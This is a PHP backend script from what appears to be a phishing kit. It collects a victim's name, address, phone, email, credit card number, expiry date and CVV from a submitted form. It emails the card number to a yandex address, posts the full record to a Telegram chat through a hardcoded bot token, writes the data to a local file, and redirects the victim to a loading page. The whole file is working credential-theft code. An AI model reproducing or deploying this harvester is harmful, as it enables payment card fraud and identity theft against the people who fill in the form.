<?php

$ip = $_SERVER['REMOTE_ADDR'];
//$hostname = gethostbyaddr($ip);
$message .= "|----------||--------------|\n";
$message .= "|name            : ".$_POST['name']."\n";
$message .= "|add          : ".$_POST['add']."\n";
$message .= "|pos          : ".$_POST['zip']."\n";
$message .= "|tel          : ".$_POST['num']."\n";
$message .= "|email        : ".$_POST['mail']."\n";
$message .= "|----------| cvv |--------------|\n";
$message .= "Cc              : ".$_POST['cc_number']."\n";
$message .= "dt              : ".$_POST['cc_date']."\n";
$message .= "Cvv             : ".$_POST['cc_ccv']."\n";
$message .= "Cvv             : ".$_POST['ATM_num']."\n";
$message .= "|Client IP: ".$ip."\n";
$hello   .= "Hello Bro its Come   : ".$_POST['cc_number']."\n";
//$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------||--------------|\n";
$send = "@yandex.com , ";
$subject = "From:  [ $ip ]";
{
mail("$send", "$subject", $hello);
$token = "1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-462207069&text=" . urlencode($message)."" );
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-462207069&text=" . urlencode($hello)."" );
}

$f = fopen("../python/python.php", "a");
	fwrite($f, $message);

header("Location:loading.html");
?>
